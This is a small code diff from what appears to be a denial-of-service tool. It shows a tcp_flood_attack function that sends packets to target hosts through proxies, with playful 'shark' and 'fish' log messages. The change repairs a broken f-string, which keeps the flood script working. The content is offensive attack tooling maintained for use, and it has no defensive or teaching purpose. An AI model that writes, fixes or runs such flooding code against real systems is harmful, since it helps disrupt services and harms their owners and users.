@@ -16,6 +16,6 @@ def tcp_flood_attack(target, proxies, duration, packet_size):
             sock.send(payload.encode())
             print(f"🦈 Shark sent TCP packet on fish: {host}:{port} by using proxy: {proxy['host']}:{proxy['port']}")
         except Exception as e:
-            print(f🐟 Oh No! The fish: {host}:{port} dodged the TCP packet frоm: {proxy['host']}:{proxy['port']} Get better proxies!: {e}")
+            print(f"🐟 Oh No! The fish: {host}:{port} dodged the TCP packet frоm: {proxy['host']}:{proxy['port']} Get better proxies!: {e}")
         finally:
             sock.close()
